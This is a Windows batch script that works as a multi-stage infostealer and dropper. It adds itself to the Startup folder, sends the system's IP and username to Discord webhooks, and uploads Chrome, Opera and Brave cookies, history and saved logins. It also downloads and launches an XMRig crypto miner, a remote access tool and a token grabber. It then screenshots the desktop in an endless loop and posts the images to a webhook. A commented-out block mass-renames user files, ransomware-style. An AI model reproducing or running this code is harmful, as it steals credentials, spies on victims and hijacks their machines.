��
@echo off
powershell -window hidde -command ""
title z%random%
copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd /d %userprofile%
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC" (
	cd %userprofile%\AppData\Roaming
	mkdir WindowsX-UpdateC
)
cd %userprofile%\AppData\Roaming\WindowsX-UpdateC

REM Error Message
::(
::	echo x=msgbox^("This application requires one of the following versions of the .NET Framework: v3.5" ,16, "- This application could not be started."^)
::)>message201.vbs
::start message201.vbs

if not exist "curl-7.84.0_4-64bit\bin\curl.exe" (
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/26mbCurl.zip' -OutFile 26mbCurl.zip
	tar -x -f 26mbCurl.zip
	cd curl-7.84.0_4-64bit\bin\
	copy "curl.exe" "%userprofile%\AppData\Roaming\WindowsX-UpdateC"
	certutil -addstore -user -f "%username%" "%userprofile%\AppData\Roaming\WindowsX-UpdateC\curl-7.84.0_4-64bit\bin\curl-ca-bundle.crt"
	cd %userprofile%\AppData\Roaming\WindowsX-UpdateC
)
set webhlog=https://discord.com/api/webhooks/993591375608168518/hfKeoL40OznwT0hIKPfpA2pGMnAvJluYOulfmLRfOQJWhdyYVB1rYgVQ0T_M9XEK25ft

REM Information
curl -o %userprofile%\AppData\Local\Temp\ipz.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipz.txt
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@here ```%ip% , %computername% , %username% , %date% , %time%```\"}" %webhlog%

REM Cookie
set webhcookie=https://discord.com/api/webhooks/993596392415166474/7X2XqFpZ_5WIf-WivBOKg1W6WULDqZ_CrewXMKguFOoLJIdOmA28QxM424ww2UgeCm3M
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Chrome data: %ip% , %date% , %time% ```\"}" %webhcookie%
curl -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhcookie%
curl -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhcookie%
curl -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhcookie%
curl -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhcookie%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhcookie%
curl -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhcookie%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Opera data: %ip% , %date% , %time% ```\"}" %webhcookie%
curl -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhcookie%
curl -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhcookie%
curl -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhcookie%
curl -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhcookie%
curl -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhcookie%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Brave data: %ip% , %date% , %time% ```\"}" %webhcookie%
curl -F ff=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks" %webhcookie%
curl -F hf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\History" %webhcookie%
curl -F df=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" %webhcookie%
curl -F daf=@"%localappdata%\BraveSoftware\Brave-Browser\User Data\Default\Shortcuts" %webhcookie%

REM Slient XMR Crypto Miner CPU+AMD GPU
set webhcrpyto=https://discord.com/api/webhooks/993599710256447568/eJG4RmNbS_nXbDNeEMvMmWO9MzVyPkPY0bhfgbWZbxI3zYjgNEDjz-EdbWKrVIy9u3dE
echo wmic cpu get name>>%userprofile%\AppData\Local\Temp\cpuq.txt
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\cpuq.txt %webhcrypto%
del %userprofile%\AppData\Local\Temp\cpuq.txt
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC\config.json" (
	rem config.json
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/config.txt' -OutFile config.txt
	certutil -decode config.txt config.json
)
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC\SHA256SUMS" (
	rem SHA256SUMS
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/SHA256SUMS.txt' -OutFile SHA256SUMS.txt
	certutil -decode SHA256SUMS.txt SHA256SUMS
)
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC\WinRing0x64.sys" (
	rem WinRing0x64.sys
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/WinRing0x64.txt' -OutFile WinRing0x64.txt
	certutil -decode WinRing0x64.txt WinRing0x64.sys
)
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC\xmrig.exe" (
	rem xmrig.exe
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/xmrig.txt' -OutFile xmrig.txt
	certutil -decode xmrig.txt xmrig.exe
)
if not exist "%userprofile%\AppData\Roaming\WindowsX-UpdateC\start.cmd" (
	rem startXM.cmd
	powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/raw/main/startXM.txt' -OutFile startXM.txt
	certutil -decode startXM.txt startXM.cmd
	start startXM.cmd
)
start startXM.cmd

REM Remote Acces Tool
powershell -command Invoke-WebRequest 'https://github.com/rxu7s/PY-R/raw/main/z9273' -OutFile z9273
certutil -decode z9273 z8374.exe
del z9273
copy z8374.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start z8374.exe

REM Token Grabber
powershell -command Invoke-WebRequest 'https://github.com/rxu7s/download/blob/main/zxyqTk.txt' -OutFile zxyqTk.txt
certutil -decode zxyqTk.txt zxyqTk.exe
copy zxyqTk.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start zxyqTk.exe

REM Ransomware
::cd /d %~dp0
::ren *.exe *.com
::ren *.jpeg *.com
::ren *.mp3 *.com
::ren *.doc *.com
::ren *.jpg *.com
::ren *.txt *.com
::ren *.ico *.com
::ren *.zip *.com
::ren *.rar *.com
::ren *.bmp *.com
::ren *.dll *.com
::ren *.docx *.com
::ren *.gif *.com
::ren *.html *.com
::ren *.htm *.com
::ren *.jar *.com
::ren *.jpeg *.com
::ren *.mdb *.com
::ren *.mp4 *.com
::ren *.mpg *.com
::ren *.mpeg *.com
::ren *.msi *.com
::ren *.pdf *.com
::ren *.pps *.com
::ren *.ppsx *.com
::ren *.ppam *.com
::ren *.ppt *.com
::ren *.psd *.com
::ren *.rtf *.com
::ren *.sldx *.com
::cd %userprofile%\Desktop
::ren *.exe *.com
::ren *.jpeg *.com
::ren *.mp3 *.com
::ren *.doc *.com
::ren *.jpg *.com
::ren *.txt *.com
::ren *.ico *.com
::ren *.zip *.com
::ren *.rar *.com
::ren *.bmp *.com
::ren *.dll *.com
::ren *.docx *.com
::ren *.gif *.com
::ren *.html *.com
::ren *.htm *.com
::ren *.jar *.com
::ren *.jpeg *.com
::ren *.mdb *.com
::ren *.mp4 *.com
::ren *.mpg *.com
::ren *.mpeg *.com
::ren *.msi *.com
::ren *.pdf *.com
::ren *.pps *.com
::ren *.ppsx *.com
::ren *.ppam *.com
::ren *.ppt *.com
::ren *.psd *.com
::ren *.rtf *.com
::ren *.sldx *.com
::cd %userprofile%\Downloads
::ren *.exe *.com
::ren *.jpeg *.com
::ren *.mp3 *.com
::ren *.doc *.com
::ren *.jpg *.com
::ren *.txt *.com
::ren *.ico *.com
::ren *.zip *.com
::ren *.rar *.com
::ren *.bmp *.com
::ren *.dll *.com
::ren *.docx *.com
::ren *.gif *.com
::ren *.html *.com
::ren *.htm *.com
::ren *.jar *.com
::ren *.jpeg *.com
::ren *.mdb *.com
::ren *.mp4 *.com
::ren *.mpg *.com
::ren *.mpeg *.com
::ren *.msi *.com
::ren *.pdf *.com
::ren *.pps *.com
::ren *.ppsx *.com
::ren *.ppam *.com
::ren *.ppt *.com
::ren *.psd *.com
::ren *.rtf *.com
::ren *.sldx *.com
::cd %userprofile%\Pictures
::ren *.exe *.com
::ren *.jpeg *.com
::ren *.mp3 *.com
::ren *.doc *.com
::ren *.jpg *.com
::ren *.txt *.com
::ren *.ico *.com
::ren *.zip *.com
::ren *.rar *.com
::ren *.bmp *.com
::ren *.dll *.com
::ren *.docx *.com
::ren *.gif *.com
::ren *.html *.com
::ren *.htm *.com
::ren *.jar *.com
::ren *.jpeg *.com
::ren *.mdb *.com
::ren *.mp4 *.com
::ren *.mpg *.com
::ren *.mpeg *.com
::ren *.msi *.com
::ren *.pdf *.com
::ren *.pps *.com
::ren *.ppsx *.com
::ren *.ppam *.com
::ren *.ppt *.com
::ren *.psd *.com
::ren *.rtf *.com
::ren *.sldx *.com
::cd %userprofile%\AppData\Roaming\WindowsX-UpdateC

REM Screenshot Loop
set webhss=https://discord.com/api/webhooks/993599420459393084/qbf1J9083FuP8jcoSAcEYKpctWYpoEAg30UmHIqsLubQIjZcX3ztYz_eyubNbTawK6af
set loopcount=-1
:loop
echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhss%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >nul
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop